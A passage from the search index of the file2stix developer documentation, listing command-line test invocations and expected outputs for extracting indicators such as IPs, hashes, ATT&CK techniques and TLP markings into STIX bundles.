--update-mitre-cti-database Enterprise Matrix (test subtechnique) \u00b6 file2stix --input-file tests/observable_tests/mitre_attck_enterprise_subtechnique.txt --update-mitre-cti-database Enterprise Matrix (version 8 / 10) \u00b6 No extraction, as subtechnique (in enterprise matrix) not present in version: file2stix --input-file tests/observable_tests/mitre_attck_enterprise-v12-not-v8-enterprise-technique.txt --update-mitre-cti-database --mitre-attack-version \"ATT&CK-v8.0\" Extraction, as subtechnique present in version: file2stix --input-file tests/observable_tests/mitre_attck_enterprise-v12-not-v8-enterprise-technique.txt --update-mitre-cti-database --mitre-attack-version \"ATT&CK-v12.1\" Enterprise Matrix (version 8 / 9) \u00b6 No extraction, as technique (in enterprise matrix) not present in version: file2stix --input-file tests/observable_tests/mitre_attck_enterprise-v9-not-v8-enterprise-technique.txt --update-mitre-cti-database --mitre-attack-version \"ATT&CK-v8.0\" Extraction, as technique not present in version: file2stix --input-file tests/observable_tests/mitre_attck_enterprise-v9-not-v8-enterprise-technique.txt --update-mitre-cti-database --mitre-attack-version \"ATT&CK-v9.0\" ICS Matrix \u00b6 file2stix --input-file tests/observable_tests/mitre_attck_ics.txt --update-mitre-cti-database Mobile Matrix \u00b6 file2stix --input-file tests/observable_tests/mitre_attck_mobile.txt --update-mitre-cti-database MITRE CAPEC \u00b6 file2stix --input-file tests/observable_tests/mitre_capec.txt --update-mitre-cti-database Windows Registry Key \u00b6 file2stix --input-file tests/observable_tests/registry_key.txt Sigma Rule \u00b6 file2stix --input-file tests/observable_tests/sigma_rule.txt file2stix --input-file tests/observable_tests/sigma_rule_2.txt file2stix --input-file tests/observable_tests/sigma_rule_3.txt URL \u00b6 file2stix --input-file tests/observable_tests/url.txt User Agent \u00b6 file2stix --input-file tests/observable_tests/user_agent.txt YARA Rule \u00b6 file2stix --input-file tests/observable_tests/yara_rule.txt MAC Address \u00b6 file2stix --input-file tests/observable_tests/mac_address.txt Testing custom extractions \u00b6 Using exact match \u00b6 file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/malware_custom_extraction_exact.txt file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/test_extraction_exact.txt Using regex \u00b6 file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/malware_custom_extraction_regex.txt file2stix --input-file tests/observable_tests/ipv4.txt --custom-extraction-file tests/custom_extractions/regex_custom_extraction.txt Extracting explicit ATT&CK Objects \u00b6 file2stix --input-file tests/custom_extractions/extract_as_attack_capec_objects.txt --custom-extraction-file tests/custom_extractions/extract_as_attack_capec_objects.txt Check warnings for bad custom input file \u00b6 file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/malware_custom_extraction_exact_bad.txt Testing lookups \u00b6 Matching extractions \u00b6 file2stix --input-file tests/lookups/malware-names.txt file2stix --input-file tests/lookups/threat-actors.txt file2stix --input-file tests/lookups/tools.txt Ignore lookups \u00b6 Single lookup: file2stix --input-file tests/lookups/tools.txt --ignore-lookup-prefix tools Multi-lookup file2stix --input-file tests/lookups/multi-lookup-match.txt --ignore-lookup-prefix tools,malware Disabling lookup file \u00b6 TODO Testing branding \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt Testing filetypes \u00b6 Supported filetypes \u00b6 .csv \u00b6 file2stix --input-file tests/file_inputs/csv/input.csv .doc \u00b6 file2stix --input-file tests/file_inputs/doc/input.doc file2stix --input-file tests/file_inputs/doc/input.docx file2stix --input-file tests/file_inputs/doc/ipv4.docx .html \u00b6 file2stix --input-file tests/file_inputs/html/input.html Large complex HTML \u00b6 file2stix --input-file tests/file_inputs/html/catapult-spider-adversary-quest-walkthrough-2022.html file2stix --input-file tests/file_inputs/html/OriginLogger-A-Look-at-Agent-Teslas-Successor.html .json \u00b6 file2stix --input-file tests/file_inputs/json/input.json .md \u00b6 file2stix --input-file tests/file_inputs/md/input.md .pdf \u00b6 file2stix --input-file tests/file_inputs/pdf/input.pdf Large complex PDFs file2stix --input-file tests/file_inputs/pdf/rpt_APT37.pdf file2stix --input-file tests/file_inputs/pdf/FireEye-APT39.pdf .txt \u00b6 file2stix --input-file tests/file_inputs/txt/input.txt .xls \u00b6 file2stix --input-file tests/file_inputs/xls/input.xls file2stix --input-file tests/file_inputs/xls/input.xlsx .xml \u00b6 file2stix --input-file tests/file_inputs/xml/input.xml .yaml \u00b6 file2stix --input-file tests/file_inputs/yaml/input.yaml file2stix --input-file tests/file_inputs/yaml/input.yml .yara \u00b6 file2stix --input-file tests/file_inputs/yara/input.yar file2stix --input-file tests/file_inputs/yara/input.yara Unsupported filetypes \u00b6 .py \u00b6 file2stix --input-file setup.py Testing defanging of data \u00b6 file2stix --input-file tests/file_inputs/fanged_data/fanged_data.txt --defang-observables file2stix --input-file tests/file_inputs/fanged_data/fanged_data.txt Testing Warning Lists \u00b6 Default Warning List - String \u00b6 file2stix --input-file tests/warning_lists/default_list_matches-string.txt Default Warning List - Sub-string \u00b6 file2stix --input-file tests/warning_lists/default_list_matches-substring.txt Default Warning List - Hostname \u00b6 file2stix --input-file tests/warning_lists/default_list_matches-hostname.txt Default Warning List - CIDR \u00b6 file2stix --input-file tests/warning_lists/default_list_matches-cidr.txt Custom Warning List \u00b6 file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file tests/warning_lists/custom_list.json --tlp-level GREEN Remote Warning List \u00b6 file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file \"https://raw.githubusercontent.com/signalscorps/file2stix/main/tests/warning_lists/custom_list_2.json\" --tlp-level GREEN Bad Warning List (should throw error) \u00b6 file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file \"https://raw.githubusercontent.com/signalscorps/file2stix/main/tests/warning_lists/bad_warning_list.json\" --tlp-level GREEN Ignore (do not extract) default warning list match extractions \u00b6 file2stix --input-file tests/warning_lists/default_list_matches-substring.txt --ignore-warninglist-observables Ignore (do not extract) custom warning list match extractions \u00b6 file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file tests/warning_lists/custom_list.json --tlp-level GREEN --ignore-warninglist-observables Testing script modes \u00b6 Analysis Mode \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --extraction-mode analysis Should be the same output as file2stix --input-file tests/observable_tests/ipv4.txt Observed Mode \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --extraction-mode observed Sighting Mode \u00b6 Single extraction (sighting) file2stix --input-file tests/observable_tests/crypto_btc.txt --extraction-mode sighting Multiple extractions (sightings) file2stix --input-file tests/observable_tests/ipv4.txt --extraction-mode sighting Testing processed file \u00b6 file2stix --input-file tests/file_inputs/html/catapult-spider-adversary-quest-walkthrough-2022.html --output-processed-input-file output.txt file2stix --input-file tests/observable_tests/ipv4.txt --output-processed-input-file ipv4-output.txt Testing TLPs \u00b6 TLP:WHITE \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level WHITE Expected output: All report and relationship objects have property: \"object_marking_refs\": \"marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da\" On every new run of same report input, the modified property of previously extracted objects is updated and the bundle includes the newly modified object. TLP:GREEN \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level GREEN Expected output: All objects have property: \"object_marking_refs\": \"marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da\" On every new run of same report input, new objects are always created. TLP:AMBER \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level AMBER Expected output: All objects have property: \"object_marking_refs\": \"marking-definition--f88d31f6-486f-44da-b317-01333bde0b82\" On every new run of same report input, new objects are always created. TLP:RED \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level RED Expected output: All objects have property: \"object_marking_refs\": \"marking-definition--5e57c739-391a-4eb3-b6be-7d15ca92d5ed\" On every new run of same report input, new objects are always created. TLP:BAD \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level BAD Expected output: Error message: Invalid choice Testing ignore observable \u00b6 Ignore IPv4 \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --ignore-observable-prefix ipv4 Expected output: Warning message: no observables extracted Ignore IPv4 and Url \u00b6 file2stix --input-file tests/file_inputs/txt/input.txt --ignore-observable-prefix \\ IPv4Observable,IPv4WithPortObservable,\\ IPv6Observable,IPv6WithPortObservable,\\ FileNameObservable,FileHashMD5Observable,\\ FileHashSHA1Observable,\\ FileHashSHA256Observable,\\ FileHashSHA512Observable,\\ FileHashSsDeepObservable,\\ DirectoryPathObservable,\\ DomainNameObservable,\\ UrlObservable,\\ EmailAddressObservable,\\ MacAddressObservable,\\ WindowsRegistryKeyObservable,\\ UserAgentObservable,\\ AutonomousSystemNumberObservable,\\ CryptocurrencyBTCObservable,\\ CryptocurrencyETHObservable,\\ CryptocurrencyXMRObservable,\\ CountryNameObservable,\\ CountryCodeAlpha2Observable,\\ CountryCodeAlpha3Observable,\\ MastercardCreditCardObservable,\\ VisaCreditCardObservable,\\ AmexCreditCardObservable,\\ UnionPayCreditCardObservable,\\ DinersCreditCardObservable,\\ JCBCreditCardObservable,\\ IBANCodeObservable,\\ YaraRuleObservable,\\ CPEObservable,\\ CVEObservable,\\ MITREEnterpriseAttackObservable,\\ MITREMobileAttackObservable,\\ MITREICSAttackObservable,\\ MITRECapecObservable,\\ CustomObservable Testing adding custom identity \u00b6 Valid identity \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --user-identity-file tests/stix_templates/custom_identity_good.yml Invalid identity \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN Testing backends \u00b6 Valid arangodb backend \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --backend tests/backends/arangodb.yml Testing alternative bundle directory \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --output-json-file stix2_bundles_alt Testing confidence \u00b6 TLP Green \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level GREEN --confidence 100 TLP Amber \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level AMBER --confidence 100 TLP Red \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level RED --confidence 100 TLP White Warning \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt --confidence 100 Should process the file, but throw a warning that it won't include confidence scores in CLI Testing reuse of STIX Object \u00b6 The following test use the same single observble in test_a.txt ( 198.51.100.3 ) The following commands should all create a different id property for the Indicator Observable 198.51.100.3 1.0 \u00b6 file2stix --input-file tests/extraction_tests/test_a.txt --tlp-level GREEN ```` #### 1.1 ```shell file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO New ipv4 SCO 1.2 \u00b6 Change confidence file2stix --input-file tests/extraction_tests/test_a.txt --confidence 90 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO Same ipv4 SCO as 1.1 1.3 \u00b6 Change user identity file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good2.yml --tlp-level GREEN --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO Same ipv4 SCO as 1.1 1.4 \u00b6 Change TLP file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level AMBER --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO New ipv4 SCO 1.5 \u00b6 Change branding file2stix --input-file tests/extraction_tests/test_a.txt --confidence 90 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO Same ipv4 SCO as 1.1 1.6 \u00b6 Change defang file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO New ipv4 SCO file2stix --input-file tests/extraction_tests/test_b.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json Same indicator SDO (1.6) Same ipv4 SCO (1.6) 1.7 \u00b6 Change MISP Warning List file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding New indicator SDO Same ipv4 SCO as 1.1 Testing custom defintions for SCOs \u00b6 Cryptocurrency SCO \u00b6 file2stix --input-file tests/observable_tests/crypto_btc.txt Credit Card SCO \u00b6 file2stix --input-file tests/observable_tests/credit_card_mastercard.txt ASN SCO \u00b6 file2stix --input-file tests/observable_tests/asn.txt Bank account SCO \u00b6 file2stix --input-file tests/observable_tests/iban.txt User Agent SCO \u00b6 file2stix --input-file tests/observable_tests/user_agent.txt CPE Properties (Software SCO) \u00b6 file2stix --input-file tests/observable_tests/cpe.txt Testing custom defintions for SDOs \u00b6 MISP Warning Lists Properties (Indicator SDO) \u00b6 file2stix --input-file tests/warning_lists/default_list_matches-string.txt file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file tests/warning_lists/custom_list.json --tlp-level GREEN Sigma Rule Properties (Indicator SDO) \u00b6 file2stix --input-file tests/observable_tests/sigma_rule.txt CVE Properties (Vulnerability SCO) \u00b6 file2stix --input-file tests/observable_tests/cve.txt","title":"5. Developers / Testing"},{"location":"developers/#developers","text":"file2stix was built to be extended. This section of the documentation covers information that will be useful to developers.","title":"Developers"},{"location":"developers/#useful-public-intel-sources-for-testing","text":"ORKL Threat Intelligence Library APT & CyberCriminal Campaign Collection","title":"Useful public intel sources for testing"},{"location":"developers/#running-tests","text":"Ensure that pytest is installed: pip install pytest Then run pytest command in the command line to run all tests: pytest","title":"Running tests"},{"location":"developers/#testing-obeservable-types","text":"","title":"Testing obeservable types"},{"location":"developers/#supported-observables","text":"","title":"Supported observables"},{"location":"developers/#asn","text":"file2stix --input-file tests/observable_tests/asn.txt","title":"ASN"},{"location":"developers/#country","text":"file2stix --input-file tests/observable_tests/country_adjective.txt file2stix --input-file tests/observable_tests/country_code.txt","title":"Country"},{"location":"developers/#cve","text":"file2stix --input-file tests/observable_tests/cve.txt","title":"CVE"},{"location":"developers/#cpe","text":"file2stix --input-file tests/observable_tests/cpe.txt","title":"CPE"},{"location":"developers/#cyptocurrency","text":"","title":"Cyptocurrency"},{"location":"developers/#btc","text":"file2stix --input-file tests/observable_tests/crypto_btc.txt","title":"BTC"},{"location":"developers/#eth","text":"file2stix --input-file tests/observable_tests/crypto_eth.txt","title":"ETH"},{"location":"developers/#xmr","text":"file2stix --input-file tests/observable_tests/crypto_xmr.txt","title":"XMR"},{"location":"developers/#credit-card","text":"","title":"Credit Card"},{"location":"developers/#amex","text":"file2stix --input-file tests/observable_tests/credit_card_amex.txt","title":"Amex"},{"location":"developers/#mastercard","text":"file2stix --input-file tests/observable_tests/credit_card_mastercard.txt","title":"Mastercard"},{"location":"developers/#visa","text":"file2stix --input-file tests/observable_tests/credit_card_visa.txt","title":"Visa"},{"location":"developers/#discover","text":"file2stix --input-file tests/observable_tests/credit_card_discover.txt","title":"Discover"},{"location":"developers/#diners","text":"file2stix --input-file tests/observable_tests/diners.txt","title":"Diners"},{"location":"developers/#union-pay","text":"file2stix --input-file tests/observable_tests/credit_card_union_pay.txt","title":"Union Pay"},{"location":"developers/#jcb","text":"file2stix --input-file tests/observable_tests/credit_card_jcb.txt","title":"JCB"},{"location":"developers/#directory","text":"file2stix --input-file tests/observable_tests/directory.txt","title":"Directory"},{"location":"developers/#domain-sub-domain","text":"","title":"Domain / sub-domain"},{"location":"developers/#domain","text":"file2stix --input-file tests/observable_tests/domain.txt","title":"Domain"},{"location":"developers/#subdomain","text":"file2stix --input-file tests/observable_tests/domain_sub.txt","title":"Subdomain"},{"location":"developers/#email","text":"file2stix --input-file tests/observable_tests/email.txt","title":"Email"},{"location":"developers/#filehash","text":"","title":"Filehash"},{"location":"developers/#md5","text":"file2stix --input-file tests/observable_tests/file_hash_md5.txt","title":"md5"},{"location":"developers/#sha1","text":"file2stix --input-file tests/observable_tests/file_hash_sha1.txt","title":"sha1"},{"location":"developers/#sha256","text":"file2stix --input-file tests/observable_tests/file_hash_sha256.txt","title":"sha256"},{"location":"developers/#sha512","text":"file2stix --input-file tests/observable_tests/file_hash_sha512.txt","title":"sha512"},{"location":"developers/#ssdeep","text":"file2stix --input-file tests/observable_tests/file_hash_ssdeep.txt","title":"ssdeep"},{"location":"developers/#file","text":"file2stix --input-file tests/observable_tests/file.txt","title":"File"},{"location":"developers/#bank-account","text":"file2stix --input-file tests/observable_tests/iban.txt","title":"Bank Account"},{"location":"developers/#ipv4","text":"","title":"IPv4"},{"location":"developers/#ipv4_1","text":"file2stix --input-file tests/observable_tests/ipv4.txt file2stix --input-file tests/observable_tests/ipv4-multi.txt","title":"IPv4"},{"location":"developers/#ipv4-with-port","text":"file2stix --input-file tests/observable_tests/ipv4_port.txt","title":"IPv4 with port"},{"location":"developers/#ipv4-with-cidr","text":"file2stix --input-file tests/observable_tests/ipv4_cidr.txt","title":"IPv4 with CIDR"},{"location":"developers/#ipv6","text":"","title":"IPv6"},{"location":"developers/#ipv6_1","text":"file2stix --input-file tests/observable_tests/ipv6.txt","title":"IPv6"},{"location":"developers/#ipv6-with-port","text":"file2stix --input-file tests/observable_tests/ipv6_port.txt","title":"IPv6 with port"},{"location":"developers/#ipv6-with-cidr","text":"file2stix --input-file tests/observable_tests/ipv6_cidr.txt","title":"IPv6 with CIDR"},{"location":"developers/#mitre-attck","text":"","title":"MITRE ATT&amp;CK"},{"location":"developers/#shared-matrices","text":"file2stix --input-file tests/observable_tests/mitre_attck_all.txt --update-mitre-cti-database","title":"Shared Matrices"},{"location":"developers/#enterprise-matrix-newest","text":"file2stix --input-file tests/observable_tests/mitre_attck_enterprise.txt --update-mitre-cti-database","title":"Enterprise Matrix (newest)"},{"location":"developers/#enterprise-matrix-test-subtechnique","text":"file2stix --input-file tests/observable_tests/mitre_attck_enterprise_subtechnique.txt --update-mitre-cti-database","title":"Enterprise Matrix (test subtechnique)"},{"location":"developers/#enterprise-matrix-version-8-10","text":"No extraction, as subtechnique (in enterprise matrix) not present in version: file2stix --input-file tests/observable_tests/mitre_attck_enterprise-v12-not-v8-enterprise-technique.txt --update-mitre-cti-database --mitre-attack-version \"ATT&CK-v8.0\" Extraction, as subtechnique present in version: file2stix --input-file tests/observable_tests/mitre_attck_enterprise-v12-not-v8-enterprise-technique.txt --update-mitre-cti-database --mitre-attack-version \"ATT&CK-v12.1\"","title":"Enterprise Matrix (version 8 / 10)"},{"location":"developers/#enterprise-matrix-version-8-9","text":"No extraction, as technique (in enterprise matrix) not present in version: file2stix --input-file tests/observable_tests/mitre_attck_enterprise-v9-not-v8-enterprise-technique.txt --update-mitre-cti-database --mitre-attack-version \"ATT&CK-v8.0\" Extraction, as technique not present in version: file2stix --input-file tests/observable_tests/mitre_attck_enterprise-v9-not-v8-enterprise-technique.txt --update-mitre-cti-database --mitre-attack-version \"ATT&CK-v9.0\"","title":"Enterprise Matrix (version 8 / 9)"},{"location":"developers/#ics-matrix","text":"file2stix --input-file tests/observable_tests/mitre_attck_ics.txt --update-mitre-cti-database","title":"ICS Matrix"},{"location":"developers/#mobile-matrix","text":"file2stix --input-file tests/observable_tests/mitre_attck_mobile.txt --update-mitre-cti-database","title":"Mobile Matrix"},{"location":"developers/#mitre-capec","text":"file2stix --input-file tests/observable_tests/mitre_capec.txt --update-mitre-cti-database","title":"MITRE CAPEC"},{"location":"developers/#windows-registry-key","text":"file2stix --input-file tests/observable_tests/registry_key.txt","title":"Windows Registry Key"},{"location":"developers/#sigma-rule","text":"file2stix --input-file tests/observable_tests/sigma_rule.txt file2stix --input-file tests/observable_tests/sigma_rule_2.txt file2stix --input-file tests/observable_tests/sigma_rule_3.txt","title":"Sigma Rule"},{"location":"developers/#url","text":"file2stix --input-file tests/observable_tests/url.txt","title":"URL"},{"location":"developers/#user-agent","text":"file2stix --input-file tests/observable_tests/user_agent.txt","title":"User Agent"},{"location":"developers/#yara-rule","text":"file2stix --input-file tests/observable_tests/yara_rule.txt","title":"YARA Rule"},{"location":"developers/#mac-address","text":"file2stix --input-file tests/observable_tests/mac_address.txt","title":"MAC Address"},{"location":"developers/#testing-custom-extractions","text":"","title":"Testing custom extractions"},{"location":"developers/#using-exact-match","text":"file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/malware_custom_extraction_exact.txt file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/test_extraction_exact.txt","title":"Using exact match"},{"location":"developers/#using-regex","text":"file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/malware_custom_extraction_regex.txt file2stix --input-file tests/observable_tests/ipv4.txt --custom-extraction-file tests/custom_extractions/regex_custom_extraction.txt","title":"Using regex"},{"location":"developers/#extracting-explicit-attck-objects","text":"file2stix --input-file tests/custom_extractions/extract_as_attack_capec_objects.txt --custom-extraction-file tests/custom_extractions/extract_as_attack_capec_objects.txt","title":"Extracting explicit ATT&amp;CK Objects"},{"location":"developers/#check-warnings-for-bad-custom-input-file","text":"file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/malware_custom_extraction_exact_bad.txt","title":"Check warnings for bad custom input file"},{"location":"developers/#testing-lookups","text":"","title":"Testing lookups"},{"location":"developers/#matching-extractions","text":"file2stix --input-file tests/lookups/malware-names.txt file2stix --input-file tests/lookups/threat-actors.txt file2stix --input-file tests/lookups/tools.txt","title":"Matching extractions"},{"location":"developers/#ignore-lookups","text":"Single lookup: file2stix --input-file tests/lookups/tools.txt --ignore-lookup-prefix tools Multi-lookup file2stix --input-file tests/lookups/multi-lookup-match.txt --ignore-lookup-prefix tools,malware","title":"Ignore lookups"},{"location":"developers/#disabling-lookup-file","text":"TODO","title":"Disabling lookup file"},{"location":"developers/#testing-branding","text":"file2stix --input-file tests/observable_tests/ipv4.txt","title":"Testing branding"},{"location":"developers/#testing-filetypes","text":"","title":"Testing filetypes"},{"location":"developers/#supported-filetypes","text":"","title":"Supported filetypes"},{"location":"developers/#csv","text":"file2stix --input-file tests/file_inputs/csv/input.csv","title":".csv"},{"location":"developers/#doc","text":"file2stix --input-file tests/file_inputs/doc/input.doc file2stix --input-file tests/file_inputs/doc/input.docx file2stix --input-file tests/file_inputs/doc/ipv4.docx","title":".doc"},{"location":"developers/#html","text":"file2stix --input-file tests/file_inputs/html/input.html","title":".html"},{"location":"developers/#large-complex-html","text":"file2stix --input-file tests/file_inputs/html/catapult-spider-adversary-quest-walkthrough-2022.html file2stix --input-file tests/file_inputs/html/OriginLogger-A-Look-at-Agent-Teslas-Successor.html","title":"Large complex HTML"},{"location":"developers/#json","text":"file2stix --input-file tests/file_inputs/json/input.json","title":".json"},{"location":"developers/#md","text":"file2stix --input-file tests/file_inputs/md/input.md","title":".md"},{"location":"developers/#pdf","text":"file2stix --input-file tests/file_inputs/pdf/input.pdf Large complex PDFs file2stix --input-file tests/file_inputs/pdf/rpt_APT37.pdf file2stix --input-file tests/file_inputs/pdf/FireEye-APT39.pdf","title":".pdf"},{"location":"developers/#txt","text":"file2stix --input-file tests/file_inputs/txt/input.txt","title":".txt"},{"location":"developers/#xls","text":"file2stix --input-file tests/file_inputs/xls/input.xls file2stix --input-file tests/file_inputs/xls/input.xlsx","title":".xls"},{"location":"developers/#xml","text":"file2stix --input-file tests/file_inputs/xml/input.xml","title":".xml"},{"location":"developers/#yaml","text":"file2stix --input-file tests/file_inputs/yaml/input.yaml file2stix --input-file tests/file_inputs/yaml/input.yml","title":".yaml"},{"location":"developers/#yara","text":"file2stix --input-file tests/file_inputs/yara/input.yar file2stix --input-file tests/file_inputs/yara/input.yara","title":".yara"},{"location":"developers/#unsupported-filetypes","text":"","title":"Unsupported filetypes"},{"location":"developers/#py","text":"file2stix --input-file setup.py","title":".py"},{"location":"developers/#testing-defanging-of-data","text":"file2stix --input-file tests/file_inputs/fanged_data/fanged_data.txt --defang-observables file2stix --input-file tests/file_inputs/fanged_data/fanged_data.txt","title":"Testing defanging of data"},{"location":"developers/#testing-warning-lists","text":"","title":"Testing Warning Lists"},{"location":"developers/#default-warning-list-string","text":"file2stix --input-file tests/warning_lists/default_list_matches-string.txt","title":"Default Warning List - String"},{"location":"developers/#default-warning-list-sub-string","text":"file2stix --input-file tests/warning_lists/default_list_matches-substring.txt","title":"Default Warning List - Sub-string"},{"location":"developers/#default-warning-list-hostname","text":"file2stix --input-file tests/warning_lists/default_list_matches-hostname.txt","title":"Default Warning List - Hostname"},{"location":"developers/#default-warning-list-cidr","text":"file2stix --input-file tests/warning_lists/default_list_matches-cidr.txt","title":"Default Warning List - CIDR"},{"location":"developers/#custom-warning-list","text":"file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file tests/warning_lists/custom_list.json --tlp-level GREEN","title":"Custom Warning List"},{"location":"developers/#remote-warning-list","text":"file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file \"https://raw.githubusercontent.com/signalscorps/file2stix/main/tests/warning_lists/custom_list_2.json\" --tlp-level GREEN","title":"Remote Warning List"},{"location":"developers/#bad-warning-list-should-throw-error","text":"file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file \"https://raw.githubusercontent.com/signalscorps/file2stix/main/tests/warning_lists/bad_warning_list.json\" --tlp-level GREEN","title":"Bad Warning List (should throw error)"},{"location":"developers/#ignore-do-not-extract-default-warning-list-match-extractions","text":"file2stix --input-file tests/warning_lists/default_list_matches-substring.txt --ignore-warninglist-observables","title":"Ignore (do not extract) default warning list match extractions"},{"location":"developers/#ignore-do-not-extract-custom-warning-list-match-extractions","text":"file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file tests/warning_lists/custom_list.json --tlp-level GREEN --ignore-warninglist-observables","title":"Ignore (do not extract) custom warning list match extractions"},{"location":"developers/#testing-script-modes","text":"","title":"Testing script modes"},{"location":"developers/#analysis-mode","text":"file2stix --input-file tests/observable_tests/ipv4.txt --extraction-mode analysis Should be the same output as file2stix --input-file tests/observable_tests/ipv4.txt","title":"Analysis Mode"},{"location":"developers/#observed-mode","text":"file2stix --input-file tests/observable_tests/ipv4.txt --extraction-mode observed","title":"Observed Mode"},{"location":"developers/#sighting-mode","text":"Single extraction (sighting) file2stix --input-file tests/observable_tests/crypto_btc.txt --extraction-mode sighting Multiple extractions (sightings) file2stix --input-file tests/observable_tests/ipv4.txt --extraction-mode sighting","title":"Sighting Mode"},{"location":"developers/#testing-processed-file","text":"file2stix --input-file tests/file_inputs/html/catapult-spider-adversary-quest-walkthrough-2022.html --output-processed-input-file output.txt file2stix --input-file tests/observable_tests/ipv4.txt --output-processed-input-file ipv4-output.txt","title":"Testing processed file"},{"location":"developers/#testing-tlps","text":"","title":"Testing TLPs"},{"location":"developers/#tlpwhite","text":"file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level WHITE Expected output: All report and relationship objects have property: \"object_marking_refs\": \"marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da\" On every new run of same report input, the modified property of previously extracted objects is updated and the bundle includes the newly modified object.","title":"TLP:WHITE"},{"location":"developers/#tlpgreen","text":"file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level GREEN Expected output: All objects have property: \"object_marking_refs\": \"marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da\" On every new run of same report input, new objects are always created.","title":"TLP:GREEN"},{"location":"developers/#tlpamber","text":"file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level AMBER Expected output: All objects have property: \"object_marking_refs\": \"marking-definition--f88d31f6-486f-44da-b317-01333bde0b82\" On every new run of same report input, new objects are always created.","title":"TLP:AMBER"},{"location":"developers/#tlpred","text":"file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level RED Expected output: All objects have property: \"object_marking_refs\": \"marking-definition--5e57c739-391a-4eb3-b6be-7d15ca92d5ed\" On every new run of same report input, new objects are always created.","title":"TLP:RED"},{"location":"developers/#tlpbad","text":"file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level BAD Expected output: Error message: Invalid choice","title":"TLP:BAD"},{"location":"developers/#testing-ignore-observable","text":"","title":"Testing ignore observable"},{"location":"developers/#ignore-ipv4","text":"file2stix --input-file tests/observable_tests/ipv4.txt --ignore-observable-prefix ipv4 Expected output: Warning message: no observables extracted","title":"Ignore IPv4"},{"location":"developers/#ignore-ipv4-and-url","text":"file2stix --input-file tests/file_inputs/txt/input.txt --ignore-observable-prefix \\ IPv4Observable,IPv4WithPortObservable,\\ IPv6Observable,IPv6WithPortObservable,\\ FileNameObservable,FileHashMD5Observable,\\ FileHashSHA1Observable,\\ FileHashSHA256Observable,\\ FileHashSHA512Observable,\\ FileHashSsDeepObservable,\\ DirectoryPathObservable,\\ DomainNameObservable,\\ UrlObservable,\\ EmailAddressObservable,\\ MacAddressObservable,\\ WindowsRegistryKeyObservable,\\ UserAgentObservable,\\ AutonomousSystemNumberObservable,\\ CryptocurrencyBTCObservable,\\ CryptocurrencyETHObservable,\\ CryptocurrencyXMRObservable,\\ CountryNameObservable,\\ 